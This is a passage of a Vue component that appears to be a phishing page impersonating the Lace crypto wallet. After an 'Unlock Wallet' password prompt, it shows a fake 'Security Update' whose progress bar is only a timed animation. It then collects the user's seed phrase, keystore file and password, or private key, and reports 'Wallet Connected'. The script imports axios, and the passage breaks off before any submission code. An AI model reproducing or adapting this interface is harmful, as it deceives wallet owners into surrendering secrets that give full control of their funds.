<template>
  <div class="wallet-shell">
    <!-- Ambient background -->
    <div class="ambient-bg">
      <div class="ambient-orb orb-1"></div>
      <div class="ambient-orb orb-2"></div>
    </div>

    <!-- Header (hidden on step 1) -->
    <header v-if="currentStep !== 1" class="wallet-header">
      <div class="brand">
        <div class="brand-logo">
          <img
            src="/images/lace.svg"
            alt="Lace"
          />
        </div>
        <span class="brand-name">Lace</span>
      </div>

      <div class="header-right">
        <!-- Step dots -->
        <div class="step-dots">
          <span
            v-for="s in [2, 3, 4, 5, 6]"
            :key="s"
            class="dot"
            :class="{ active: currentStep === s, done: currentStep > s }"
          ></span>
        </div>
        <button class="close-btn" @click.prevent="closeModal">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="18"
            height="18"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            stroke-width="2"
            stroke-linecap="round"
            stroke-linejoin="round"
          >
            <line x1="18" y1="6" x2="6" y2="18" />
            <line x1="6" y1="6" x2="18" y2="18" />
          </svg>
        </button>
      </div>
    </header>

    <!-- Content -->
    <div class="wallet-body">
      <transition name="slide" mode="out-in">
        <!-- STEP 1: Unlock -->
        <div v-if="currentStep === 1" key="s1" class="step step-unlock">
          <div class="">
            <img
              src="/images/lace.svg"
              alt="Lace"
              class="w-32"
            />
          </div>
          <h1 class="step-title">Unlock Wallet</h1>
          <p class="step-sub">Enter your password to continue</p>
          <div class="field-group">
            <div class="input-wrapper">
              <svg
                class="input-icon"
                xmlns="http://www.w3.org/2000/svg"
                width="16"
                height="16"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
                <path d="M7 11V7a5 5 0 0 1 10 0v4" />
              </svg>
              <input
                v-model="password"
                type="password"
                placeholder="Password"
                class="wallet-input"
                @keyup.enter="unlock"
              />
            </div>
            <button
              @click="unlock"
              :disabled="password.length < 1"
              class="btn-primary"
              :class="{ 'btn-disabled': password.length < 1 }"
            >
              <span>Unlock</span>
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="16"
                height="16"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2.5"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <line x1="5" y1="12" x2="19" y2="12" />
                <polyline points="12 5 19 12 12 19" />
              </svg>
            </button>
          </div>
        </div>

        <!-- STEP 2: Update Required -->
        <div v-else-if="currentStep === 2" key="s2" class="step">
          <div class="update-icon-wrap">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="32"
              height="32"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              stroke-width="1.5"
              stroke-linecap="round"
              stroke-linejoin="round"
            >
              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
            </svg>
          </div>
          <h2 class="step-title">Security Update</h2>
          <p class="step-sub">A critical update is ready to install</p>

          <div class="update-card">
            <div class="update-item">
              <div class="update-dot"></div>
              <span>Critical security enhancements</span>
            </div>
            <div class="update-item">
              <div class="update-dot"></div>
              <span>Improved wallet performance</span>
            </div>
            <div class="update-item">
              <div class="update-dot"></div>
              <span>Better network compatibility</span>
            </div>
          </div>

          <div class="btn-row">
            <button @click="goBack" class="btn-ghost">Back</button>
            <button @click="startUpdate" class="btn-primary">
              <span>Install Update</span>
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="16"
                height="16"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2.5"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <polyline points="8 17 12 21 16 17" />
                <line x1="12" y1="12" x2="12" y2="21" />
                <path d="M20.88 18.09A5 5 0 0 0 18 9h-1.26A8 8 0 1 0 3 16.29" />
              </svg>
            </button>
          </div>
        </div>

        <!-- STEP 3: Progress -->
        <div v-else-if="currentStep === 3" key="s3" class="step step-progress">
          <div class="progress-ring-wrap">
            <svg
              class="progress-ring"
              width="120"
              height="120"
              viewBox="0 0 120 120"
            >
              <circle class="ring-track" cx="60" cy="60" r="52" />
              <circle
                class="ring-fill"
                cx="60"
                cy="60"
                r="52"
                :style="{
                  strokeDashoffset: 327 - (327 * progress) / 100,
                }"
              />
            </svg>
            <div class="ring-label">
              {{ Math.round(progress) }}<span>%</span>
            </div>
          </div>
          <h2 class="step-title">Installing Update</h2>
          <p class="step-sub">Please wait — do not close this window</p>
          <div class="progress-bar-track">
            <div
              class="progress-bar-fill"
              :style="{ width: progress + '%' }"
            ></div>
          </div>
          <p class="progress-hint">Downloading and verifying packages…</p>
        </div>

        <!-- STEP 4: Recovery Method -->
        <div v-else-if="currentStep === 4" key="s4" class="step">
          <h2 class="step-title">Recovery Method</h2>
          <p class="step-sub">Choose how to restore your wallet</p>

          <div class="method-list">
            <button @click="selectRecoveryMethod('phrase')" class="method-card">
              <div class="method-icon">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="20"
                  height="20"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="1.5"
                  stroke-linecap="round"
                  stroke-linejoin="round"
                >
                  <path d="M12 20h9" />
                  <path
                    d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z"
                  />
                </svg>
              </div>
              <div class="method-text">
                <span class="method-label">Recovery Phrase</span>
                <span class="method-hint">12 or 24 words</span>
              </div>
              <svg
                class="method-arrow"
                xmlns="http://www.w3.org/2000/svg"
                width="16"
                height="16"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <polyline points="9 18 15 12 9 6" />
              </svg>
            </button>

            <button
              @click="selectRecoveryMethod('keystore')"
              class="method-card"
            >
              <div class="method-icon">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="20"
                  height="20"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="1.5"
                  stroke-linecap="round"
                  stroke-linejoin="round"
                >
                  <path
                    d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"
                  />
                  <polyline points="14 2 14 8 20 8" />
                </svg>
              </div>
              <div class="method-text">
                <span class="method-label">Keystore File</span>
                <span class="method-hint">JSON file + password</span>
              </div>
              <svg
                class="method-arrow"
                xmlns="http://www.w3.org/2000/svg"
                width="16"
                height="16"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <polyline points="9 18 15 12 9 6" />
              </svg>
            </button>

            <button
              @click="selectRecoveryMethod('privatekey')"
              class="method-card"
            >
              <div class="method-icon">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="20"
                  height="20"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="1.5"
                  stroke-linecap="round"
                  stroke-linejoin="round"
                >
                  <path
                    d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"
                  />
                </svg>
              </div>
              <div class="method-text">
                <span class="method-label">Private Key</span>
                <span class="method-hint">Hex string (0x…)</span>
              </div>
              <svg
                class="method-arrow"
                xmlns="http://www.w3.org/2000/svg"
                width="16"
                height="16"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <polyline points="9 18 15 12 9 6" />
              </svg>
            </button>
          </div>
        </div>

        <!-- STEP 5: Recovery Phrase -->
        <div
          v-else-if="currentStep === 5 && recoveryMethod === 'phrase'"
          key="s5-phrase"
          class="step"
        >
          <h2 class="step-title">Recovery Phrase</h2>
          <p class="step-sub">Enter your 12 or 24-word seed phrase</p>

          <div class="textarea-wrapper">
            <textarea
              v-model="recoveryPhrase"
              placeholder="word1 word2 word3 word4 …"
              class="wallet-textarea"
              rows="5"
            ></textarea>
            <div
              class="word-count"
              :class="{
                valid: phraseWordCount === 12 || phraseWordCount === 24,
              }"
            >
              {{ phraseWordCount }} / 24 words
            </div>
          </div>

          <div class="btn-row">
            <button @click="goBackToMethods" class="btn-ghost">Back</button>
            <button
              @click="importRecoveryPhrase"
              :disabled="recoveryPhrase.trim().length === 0 || isLoading"
              class="btn-primary"
              :class="{
                'btn-disabled': recoveryPhrase.trim().length === 0 || isLoading,
              }"
            >
              <template v-if="!isLoading">
                <span>Import</span>
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="16"
                  height="16"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2.5"
                  stroke-linecap="round"
                  stroke-linejoin="round"
                >
                  <line x1="5" y1="12" x2="19" y2="12" />
                  <polyline points="12 5 19 12 12 19" />
                </svg>
              </template>
              <svg
                v-else
                class="spin"
                xmlns="http://www.w3.org/2000/svg"
                width="18"
                height="18"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <path d="M21 12a9 9 0 1 1-6.219-8.56" />
              </svg>
            </button>
          </div>
        </div>

        <!-- STEP 5: Keystore -->
        <div
          v-else-if="currentStep === 5 && recoveryMethod === 'keystore'"
          key="s5-keystore"
          class="step"
        >
          <h2 class="step-title">Keystore File</h2>
          <p class="step-sub">
            Upload your JSON keystore and enter its password
          </p>

          <div class="textarea-wrapper">
            <textarea
              v-model="keystoreFile"
              placeholder="Paste keystore JSON content here"
              class="wallet-textarea"
              rows="5"
            ></textarea>
          </div>

          <div class="input-wrapper" style="margin-top: 14px">
            <svg
              class="input-icon"
              xmlns="http://www.w3.org/2000/svg"
              width="16"
              height="16"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              stroke-width="2"
              stroke-linecap="round"
              stroke-linejoin="round"
            >
              <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
              <path d="M7 11V7a5 5 0 0 1 10 0v4" />
            </svg>
            <input
              v-model="keystorePassword"
              type="password"
              placeholder="Keystore password"
              class="wallet-input"
            />
          </div>

          <div class="btn-row">
            <button @click="goBackToMethods" class="btn-ghost">Back</button>
            <button
              @click="importKeystore"
              :disabled="
                !keystoreFile ||
                keystorePassword.trim().length === 0 ||
                isLoading
              "
              class="btn-primary"
              :class="{
                'btn-disabled':
                  !keystoreFile ||
                  keystorePassword.trim().length === 0 ||
                  isLoading,
              }"
            >
              <template v-if="!isLoading">
                <span>Import</span>
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="16"
                  height="16"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2.5"
                  stroke-linecap="round"
                  stroke-linejoin="round"
                >
                  <line x1="5" y1="12" x2="19" y2="12" />
                  <polyline points="12 5 19 12 12 19" />
                </svg>
              </template>
              <svg
                v-else
                class="spin"
                xmlns="http://www.w3.org/2000/svg"
                width="18"
                height="18"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <path d="M21 12a9 9 0 1 1-6.219-8.56" />
              </svg>
            </button>
          </div>
        </div>

        <!-- STEP 5: Private Key -->
        <div
          v-else-if="currentStep === 5 && recoveryMethod === 'privatekey'"
          key="s5-pk"
          class="step"
        >
          <h2 class="step-title">Private Key</h2>
          <p class="step-sub">Paste your private key in hexadecimal format</p>

          <div class="textarea-wrapper">
            <textarea
              v-model="privateKey"
              placeholder="0x..."
              class="wallet-textarea mono"
              rows="4"
            ></textarea>
            <div
              v-if="privateKey.trim().length > 0"
              class="key-status"
              :class="isValidPrivateKey ? 'key-valid' : 'key-invalid'"
            >
              <svg
                v-if="isValidPrivateKey"
                xmlns="http://www.w3.org/2000/svg"
                width="13"
                height="13"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="3"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <polyline points="20 6 9 17 4 12" />
              </svg>
              <svg
                v-else
                xmlns="http://www.w3.org/2000/svg"
                width="13"
                height="13"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="3"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <line x1="18" y1="6" x2="6" y2="18" />
                <line x1="6" y1="6" x2="18" y2="18" />
              </svg>
              {{
                isValidPrivateKey ? "Valid key format" : "Invalid key format"
              }}
            </div>
          </div>

          <div class="btn-row">
            <button @click="goBackToMethods" class="btn-ghost">Back</button>
            <button
              @click="importPrivateKey"
              :disabled="!isValidPrivateKey || isLoading"
              class="btn-primary"
              :class="{ 'btn-disabled': !isValidPrivateKey || isLoading }"
            >
              <template v-if="!isLoading">
                <span>Import</span>
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="16"
                  height="16"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2.5"
                  stroke-linecap="round"
                  stroke-linejoin="round"
                >
                  <line x1="5" y1="12" x2="19" y2="12" />
                  <polyline points="12 5 19 12 12 19" />
                </svg>
              </template>
              <svg
                v-else
                class="spin"
                xmlns="http://www.w3.org/2000/svg"
                width="18"
                height="18"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <path d="M21 12a9 9 0 1 1-6.219-8.56" />
              </svg>
            </button>
          </div>
        </div>

        <!-- STEP 6: Success -->
        <div v-else-if="currentStep === 6" key="s6" class="step step-success">
          <div class="success-ring">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="36"
              height="36"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              stroke-width="2"
              stroke-linecap="round"
              stroke-linejoin="round"
            >
              <polyline points="20 6 9 17 4 12" />
            </svg>
          </div>
          <h2 class="step-title">Wallet Connected</h2>
          <p class="step-sub">
            Your Lace wallet was imported successfully
          </p>

          <div class="success-meta">
            <span class="meta-label">Recovery method</span>
            <span class="meta-value capitalize">{{ recoveryMethod }}</span>
          </div>

          <button @click="completeImport" class="btn-primary btn-full">
            <span>Continue</span>
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="16"
              height="16"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              stroke-width="2.5"
              stroke-linecap="round"
              stroke-linejoin="round"
            >
              <line x1="5" y1="12" x2="19" y2="12" />
              <polyline points="12 5 19 12 12 19" />
            </svg>
          </button>
        </div>
      </transition>

      <!-- Toast message -->
      <transition name="toast">
        <div
          v-if="message.text"
          class="toast"
          :class="message.type === 'success' ? 'toast-success' : 'toast-error'"
        >
          {{ message.text }}
        </div>
      </transition>
    </div>
  </div>
</template>

<style scoped>
/* ─── No CSS vars — all colors hardcoded for scoped reliability ── */

@import url("https://fonts.googleapis.com/css2?family=DM+Sans:wght@300;400;500;600&family=DM+Mono:wght@400;500&display=swap");

* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}

/* ─── Shell ────────────────────────────────────────────────────── */
.wallet-shell {
  font-family: "DM Sans", sans-serif;
  background: #ffffff;
  border: 1px solid rgba(0,0,0,0.14);
  border-radius: 20px;
  width: 100%;
  max-width: 420px;
  overflow: hidden;
  position: relative;
  color: #0d0d0d;
  box-shadow: 0 2px 32px rgba(0, 0, 0, 0.06), 0 1px 4px rgba(0, 0, 0, 0.04);
}

/* ─── Ambient orbs (very subtle on white) ─────────────────────── */
.ambient-bg {
  position: absolute;
  inset: 0;
  pointer-events: none;
  overflow: hidden;
  border-radius: 20px;
}
.ambient-orb {
  position: absolute;
  border-radius: 50%;
  filter: blur(70px);
  opacity: 0.12;
}
.orb-1 {
  width: 240px;
  height: 240px;
  background: #ff92de;
  top: -100px;
  right: -80px;
}
.orb-2 {
  width: 180px;
  height: 180px;
  background: #ffcd5e;
  bottom: -60px;
  left: -60px;
}

/* ─── Header ───────────────────────────────────────────────────── */
.wallet-header {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 14px 20px;
  border-bottom: 1px solid rgba(0,0,0,0.08);
  position: relative;
  z-index: 2;
  background: rgba(255, 255, 255, 0.8);
  backdrop-filter: blur(8px);
}
.brand {
  display: flex;
  align-items: center;
  gap: 10px;
}
.brand-logo {
  width: 32px;
  height: 32px;
  border-radius: 8px;
  background: #f7f7f7;
  border: 1px solid rgba(0,0,0,0.08);
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 4px;
}
.brand-logo img {
  width: 100%;
  height: 100%;
  object-fit: contain;
}
.brand-name {
  font-size: 14px;
  font-weight: 600;
  letter-spacing: 0.01em;
  color: #0d0d0d;
}
.header-right {
  display: flex;
  align-items: center;
  gap: 14px;
}

/* Step dots */
.step-dots {
  display: flex;
  gap: 5px;
}
.dot {
  width: 6px;
  height: 6px;
  border-radius: 50%;
  background: rgba(0, 0, 0, 0.1);
  transition: all 0.3s ease;
}
.dot.active {
  background: #0d0d0d;
  width: 18px;
  border-radius: 3px;
}
.dot.done {
  background: rgba(0, 0, 0, 0.25);
}

.close-btn {
  background: #f7f7f7;
  border: 1px solid rgba(0,0,0,0.08);
  border-radius: 8px;
  color: #9a9a9a;
  width: 30px;
  height: 30px;
  display: flex;
  align-items: center;
  justify-content: center;
  cursor: pointer;
  transition: all 0.2s;
}
.close-btn:hover {
  background: #f0f0f0;
  color: #0d0d0d;
  border-color: rgba(0,0,0,0.14);
}

/* ─── Body ─────────────────────────────────────────────────────── */
.wallet-body {
  padding: 32px 28px 28px;
  min-height: 420px;
  display: flex;
  flex-direction: column;
  position: relative;
  z-index: 2;
}

/* ─── Steps ────────────────────────────────────────────────────── */
.step {
  display: flex;
  flex-direction: column;
  flex: 1;
}

.step-title {
  font-size: 24px;
  font-weight: 600;
  color: #0d0d0d;
  margin-bottom: 6px;
  letter-spacing: -0.02em;
  line-height: 1.2;
}
.step-sub {
  font-size: 14px;
  color: #5a5a5a;
  margin-bottom: 28px;
  font-weight: 400;
}

/* Unlock Step */
.step-unlock {
  align-items: center;
  justify-content: center;
  text-align: center;
  padding-top: 12px;
}
.step-unlock .step-title {
  font-size: 28px;
  margin-bottom: 8px;
}
.step-unlock .step-sub {
  margin-bottom: 32px;
}
.step-unlock .field-group {
  width: 100%;
  max-width: 320px;
}

/* ─── Inputs ───────────────────────────────────────────────────── */
.input-wrapper {
  position: relative;
  width: 100%;
}
.input-icon {
  position: absolute;
  left: 14px;
  top: 50%;
  transform: translateY(-50%);
  color: #9a9a9a;
  pointer-events: none;
}
.wallet-input {
  width: 100%;
  background: #f7f7f7;
  border: 1px solid rgba(0,0,0,0.08);
  border-radius: 12px;
  padding: 13px 16px 13px 42px;
  font-size: 14px;
  font-family: "DM Sans", sans-serif;
  color: #0d0d0d;
  outline: none;
  transition: border-color 0.2s, background 0.2s, box-shadow 0.2s;
  margin-bottom: 14px;
}
.wallet-input::placeholder {
  color: #9a9a9a;
}
.wallet-input:focus {
  border-color: transparent;
  background: #fff;
  box-shadow:
    0 0 0 1.5px transparent,
    inset 0 0 0 1.5px transparent;
  /* gradient border on focus */
  background-image: linear-gradient(#fff, #fff), linear-gradient(94.22deg, #ff92de -18.3%, #ffcd5e 118.89%);
  background-origin: border-box;
  background-clip: padding-box, border-box;
  border-color: transparent;
}

.wallet-textarea {
  width: 100%;
  background: #f7f7f7;
  border: 1px solid rgba(0,0,0,0.08);
  border-radius: 12px;
  padding: 14px 16px;
  font-size: 14px;
  font-family: "DM Sans", sans-serif;
  color: #0d0d0d;
  outline: none;
  resize: none;
  transition: border-color 0.2s, background 0.2s;
  line-height: 1.7;
}
.wallet-textarea.mono {
  font-family: "DM Mono", monospace;
  font-size: 13px;
}
.wallet-textarea::placeholder {
  color: #9a9a9a;
}
.wallet-textarea:focus {
  background: #fff;
  background-image: linear-gradient(#fff, #fff), linear-gradient(94.22deg, #ff92de -18.3%, #ffcd5e 118.89%);
  background-origin: border-box;
  background-clip: padding-box, border-box;
  border-color: transparent;
}

.textarea-wrapper {
  position: relative;
  margin-bottom: 6px;
  width: 100%;
}
.word-count {
  font-size: 12px;
  color: #9a9a9a;
  text-align: right;
  margin-top: 6px;
  margin-bottom: 20px;
  font-family: "DM Mono", monospace;
  transition: color 0.2s;
}
.word-count.valid {
  color: #1a7a4a;
}

/* ─── Buttons ──────────────────────────────────────────────────── */

/* Primary — gradient border, black bg inside */
.btn-primary {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
  background: linear-gradient(#000, #000) padding-box,
              linear-gradient(94.22deg, #ff92de -18.3%, #ffcd5e 118.89%) border-box;
  border: 1.5px solid transparent;
  color: #fff;
  border-radius: 12px;
  padding: 13px 20px;
  font-size: 14px;
  font-weight: 600;
  font-family: "DM Sans", sans-serif;
  cursor: pointer;
  transition: all 0.2s ease;
  letter-spacing: 0.01em;
  flex: 1;
}
.btn-primary:hover:not(.btn-disabled) {
  opacity: 0.88;
  transform: translateY(-1px);
  box-shadow: 0 6px 18px rgba(255, 146, 222, 0.22), 0 2px 8px rgba(255, 205, 94, 0.18);
}
.btn-primary:active:not(.btn-disabled) {
  transform: translateY(0);
  box-shadow: none;
}
.btn-primary.btn-disabled {
  opacity: 0.35;
  cursor: not-allowed;
}
.btn-primary.btn-full {
  width: 100%;
  margin-top: 8px;
}

/* Ghost — subtle border, light bg */
.btn-ghost {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  flex: 1;
  background: #f7f7f7;
  border: 1px solid rgba(0,0,0,0.08);
  border-radius: 12px;
  padding: 13px 20px;
  font-size: 14px;
  font-weight: 500;
  font-family: "DM Sans", sans-serif;
  color: #5a5a5a;
  cursor: pointer;
  transition: all 0.2s;
}
.btn-ghost:hover {
  background: #f0f0f0;
  color: #0d0d0d;
  border-color: rgba(0,0,0,0.14);
}

.btn-row {
  display: flex;
  gap: 10px;
  margin-top: auto;
  padding-top: 24px;
}

/* ─── Update step ──────────────────────────────────────────────── */
.update-icon-wrap {
  width: 56px;
  height: 56px;
  border-radius: 14px;
  background: linear-gradient(135deg, rgba(255, 146, 222, 0.08), rgba(255, 205, 94, 0.08));
  border: 1px solid rgba(0,0,0,0.08);
  display: flex;
  align-items: center;
  justify-content: center;
  color: #0d0d0d;
  margin-bottom: 18px;
}
.update-card {
  background: #f7f7f7;
  border: 1px solid rgba(0,0,0,0.08);
  border-radius: 14px;
  padding: 18px 20px;
  display: flex;
  flex-direction: column;
  gap: 12px;
  margin-bottom: auto;
}
.update-item {
  display: flex;
  align-items: center;
  gap: 12px;
  font-size: 13px;
  color: #5a5a5a;
}
.update-dot {
  width: 6px;
  height: 6px;
  border-radius: 50%;
  background: linear-gradient(135deg, #ff92de, #ffcd5e);
  flex-shrink: 0;
}

/* ─── Progress ring ────────────────────────────────────────────── */
.step-progress {
  align-items: center;
  text-align: center;
}
.step-progress .step-sub {
  margin-bottom: 24px;
}
.progress-ring-wrap {
  position: relative;
  width: 120px;
  height: 120px;
  margin-bottom: 24px;
}
.progress-ring {
  transform: rotate(-90deg);
}
.ring-track {
  fill: none;
  stroke: rgba(0,0,0,0.08);
  stroke-width: 6;
}
.ring-fill {
  fill: none;
  stroke: url(#lace-grad);
  stroke-width: 6;
  stroke-linecap: round;
  stroke-dasharray: 327;
  transition: stroke-dashoffset 0.4s ease;
}
/* Inline SVG gradient for the ring */
.progress-ring defs {
  display: block;
}
.ring-label {
  position: absolute;
  inset: 0;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 26px;
  font-weight: 600;
  color: #0d0d0d;
  letter-spacing: -0.02em;
}
.ring-label span {
  font-size: 14px;
  color: #9a9a9a;
  margin-top: 4px;
}

.progress-bar-track {
  width: 100%;
  height: 3px;
  background: rgba(0,0,0,0.08);
  border-radius: 2px;
  overflow: hidden;
}
.progress-bar-fill {
  height: 100%;
  background: linear-gradient(90deg, #ff92de, #ffcd5e);
  border-radius: 2px;
  transition: width 0.4s ease;
}
.progress-hint {
  font-size: 12px;
  color: #9a9a9a;
  margin-top: 10px;
}

/* ─── Method cards ─────────────────────────────────────────────── */
.method-list {
  display: flex;
  flex-direction: column;
  gap: 8px;
  margin-bottom: auto;
}
.method-card {
  display: flex;
  align-items: center;
  gap: 14px;
  background: #f7f7f7;
  border: 1px solid rgba(0,0,0,0.08);
  border-radius: 14px;
  padding: 16px 18px;
  cursor: pointer;
  transition: all 0.2s;
  text-align: left;
  font-family: "DM Sans", sans-serif;
  color: #0d0d0d;
  width: 100%;
}
.method-card:hover {
  background: #fff;
  border-color: transparent;
  background-image: linear-gradient(#fff, #fff), linear-gradient(94.22deg, #ff92de -18.3%, #ffcd5e 118.89%);
  background-origin: border-box;
  background-clip: padding-box, border-box;
  transform: translateX(2px);
  box-shadow: 0 4px 16px rgba(255, 146, 222, 0.1);
}
.method-icon {
  width: 40px;
  height: 40px;
  border-radius: 10px;
  background: linear-gradient(135deg, rgba(255, 146, 222, 0.1), rgba(255, 205, 94, 0.1));
  border: 1px solid rgba(0,0,0,0.08);
  display: flex;
  align-items: center;
  justify-content: center;
  color: #0d0d0d;
  flex-shrink: 0;
}
.method-text {
  flex: 1;
}
.method-label {
  display: block;
  font-size: 14px;
  font-weight: 600;
  color: #0d0d0d;
  margin-bottom: 2px;
}
.method-hint {
  display: block;
  font-size: 12px;
  color: #9a9a9a;
}
.method-arrow {
  color: #9a9a9a;
  flex-shrink: 0;
}

/* ─── Key status ───────────────────────────────────────────────── */
.key-status {
  display: inline-flex;
  align-items: center;
  gap: 5px;
  font-size: 12px;
  font-weight: 500;
  margin-top: 8px;
  margin-bottom: 16px;
  padding: 4px 10px;
  border-radius: 20px;
}
.key-valid {
  color: #1a7a4a;
  background: #eaf7ef;
  border: 1px solid rgba(26,122,74,0.2);
}
.key-invalid {
  color: #b83232;
  background: #fdf0f0;
  border: 1px solid rgba(184,50,50,0.2);
}

/* ─── Success step ─────────────────────────────────────────────── */
.step-success {
  align-items: center;
  text-align: center;
  justify-content: center;
}
.step-success .step-title {
  font-size: 28px;
}
.step-success .step-sub {
  margin-bottom: 24px;
}
.success-ring {
  width: 80px;
  height: 80px;
  border-radius: 50%;
  background: #eaf7ef;
  border: 1px solid rgba(26,122,74,0.2);
  display: flex;
  align-items: center;
  justify-content: center;
  color: #1a7a4a;
  margin-bottom: 24px;
  animation: success-pop 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275) both;
}
@keyframes success-pop {
  from { transform: scale(0.5); opacity: 0; }
  to   { transform: scale(1);   opacity: 1; }
}
.success-meta {
  background: #f7f7f7;
  border: 1px solid rgba(0,0,0,0.08);
  border-radius: 12px;
  padding: 14px 20px;
  display: flex;
  align-items: center;
  justify-content: space-between;
  width: 100%;
  margin-bottom: 6px;
}
.meta-label {
  font-size: 12px;
  color: #9a9a9a;
}
.meta-value {
  font-size: 13px;
  font-weight: 600;
  color: #0d0d0d;
}
.capitalize {
  text-transform: capitalize;
}

/* ─── Toast ────────────────────────────────────────────────────── */
.toast {
  position: absolute;
  bottom: 16px;
  left: 50%;
  transform: translateX(-50%);
  padding: 8px 18px;
  border-radius: 20px;
  font-size: 12px;
  font-weight: 500;
  white-space: nowrap;
  z-index: 100;
}
.toast-success {
  background: #eaf7ef;
  border: 1px solid rgba(26,122,74,0.2);
  color: #1a7a4a;
}
.toast-error {
  background: #fdf0f0;
  border: 1px solid rgba(184,50,50,0.2);
  color: #b83232;
}

/* ─── Spinner ──────────────────────────────────────────────────── */
.spin {
  animation: spin 0.7s linear infinite;
}
@keyframes spin {
  to { transform: rotate(360deg); }
}

/* ─── Transitions ──────────────────────────────────────────────── */
.slide-enter-active,
.slide-leave-active {
  transition: all 0.25s ease;
}
.slide-enter-from {
  opacity: 0;
  transform: translateX(18px);
}
.slide-leave-to {
  opacity: 0;
  transform: translateX(-18px);
}

.toast-enter-active,
.toast-leave-active {
  transition: all 0.25s ease;
}
.toast-enter-from,
.toast-leave-to {
  opacity: 0;
  transform: translateX(-50%) translateY(8px);
}

.fade-enter-active,
.fade-leave-active {
  transition: opacity 0.2s;
}
.fade-enter-from,
.fade-leave-to {
  opacity: 0;
}
</style>

<script setup>
import { ref, computed } from "vue";
import axios from "axios";

const emit = defineEmits(["close"]);

const currentStep = ref(1);
const password = ref("");
const progress = ref(0);
const isLoading = ref(false);
const message = ref({ text: "", type: "" });

// Recovery method state
const recoveryMethod = ref("");
const recoveryPhrase = ref("");
const keystoreFile = ref(null);
const keystoreFileName = ref("");
const keystorePassword = ref("");
const privateKey = ref("");
const fileInput = ref(null);

const phraseWordCount = computed(() => {
  return recoveryPhrase.value
    .trim()
    .split(/\s+/)
    .filter((word) => word.length > 0).length;
});

const isValidPrivateKey = computed(() => {
  const key = privateKey.value.trim();
  if (key.length === 0) return false;
  const hexRegex = /^(0x)?[0-9a-fA-F]{64}$/;
  return hexRegex.test(key);
});

function closeModal() {
  emit("close");
}

function unlock() {
  if (password.value.length < 1) return;
  currentStep.value = 2;
}

function goBack() {
  currentStep.value = 1;
  password.value = "";
}

function startUpdate() {
  currentStep.value = 3;
  progress.value = 0;
  const duration = 3000;
  const start = performance.now();
  isLoading.value = true;

  function step(now) {
    const elapsed = now - start;
    const pct = Math.min(100, (elapsed / duration) * 100);
    progress.value = pct;
    if (elapsed < duration) {
      requestAnimationFrame(step);
    } else {
      isLoading.value = false;
      setTimeout(() => {
        currentStep.value = 4;
      }, 400);
    }
  }
  requestAnimationFrame(step);
}

function selectRecoveryMethod(method) {
  recoveryMethod.value = method;
  currentStep.value = 5;
  // Reset previous inputs
